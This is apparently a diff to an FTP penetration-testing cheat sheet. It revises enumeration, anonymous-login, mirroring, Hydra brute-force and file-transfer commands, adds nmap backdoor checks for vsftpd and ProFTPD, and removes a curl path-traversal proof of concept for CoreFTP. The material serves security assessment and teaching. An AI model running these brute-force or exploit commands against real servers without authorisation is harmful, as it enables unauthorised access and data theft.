@@ -8,7 +8,7 @@
 ## Enumeration
 
 ```bash
-nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor $IP
+nmap -sV -p 21 --script ftp-anon,ftp-syst $IP
 ```
 
 ---
@@ -16,7 +16,8 @@ nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd
 ## FTP Login Syntax
 
 ```bash
-ftp user@IP
+ftp $IP
+ftp> user USERNAME
 ```
 
 ---
@@ -24,16 +25,17 @@ ftp user@IP
 ## Anonymous Login
 
 ```bash
-ftp anonymous@$IP
-# Password: anonymous OR anon
+ftp $IP
+ftp> user anonymous
+# Use a benign email address as the password when prompted.
 
-ftp> ls -la
-ftp> ls -laR       # recursive listing
+ftp> ls
+ftp> dir
 ```
 
 Mirror the entire directory without interacting manually:
 ```bash
-wget -m --no-passive ftp://anonymous@$IP
+wget --mirror --no-passive "ftp://anonymous:anonymous@$IP/"
 ```
 
 ---
@@ -41,8 +43,8 @@ wget -m --no-passive ftp://anonymous@$IP
 ## Brute Force
 
 ```bash
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP
+hydra -C approved-defaults.txt ftp://$IP
+hydra -L users.txt -P passwords.txt ftp://$IP
 ```
 
 ---
@@ -50,10 +52,12 @@ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP
 ## File Transfer
 
 ```bash
-ftp> get filename        # download
-ftp> put filename        # upload
-ftp> type binary         # switch to binary mode for non-text files
+ftp> binary
+ftp> get REMOTE_FILE LOCAL_FILE
+ftp> put LOCAL_FILE REMOTE_FILE
 ```
+
+Use binary mode before transferring archives, executables, images, or other non-text files.
 
 ---
 
@@ -85,17 +89,10 @@ cat /etc/vsftpd.conf
 grep ftp /etc/passwd
 ```
 
-!!! tip "Real-world"
-    FTP is rarely exposed externally on modern networks, when you do see it, it's usually a legacy system or an oversight. Treat it as higher priority than it looks; misconfigured FTP on an internal network often has write access to paths that matter.
+## Version-Specific Checks
 
----
+For matching banners, Nmap includes targeted checks for the compromised [vsftpd 2.3.4 distribution (CVE-2011-2523)](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) and [ProFTPD 1.3.3c distribution (CVE-2010-20103)](https://nvd.nist.gov/vuln/detail/CVE-2010-20103). These CVEs apply only to specific malicious source distributions, not every server reporting the same version string. Treat a banner match as a lead rather than proof.
 
-## Known Vulnerabilities
-
-### CVE-2022-22836
-
-CoreFTP Server version 727 and below is vulnerable to [CVE-2022-22836](https://www.exploit-db.com/exploits/50652), an authenticated exploit that allows for file directory traversal using a simple cURL request.
-
-```sh
-curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+```bash
+nmap -p 21 --script ftp-vsftpd-backdoor,ftp-proftpd-backdoor $IP
 ```
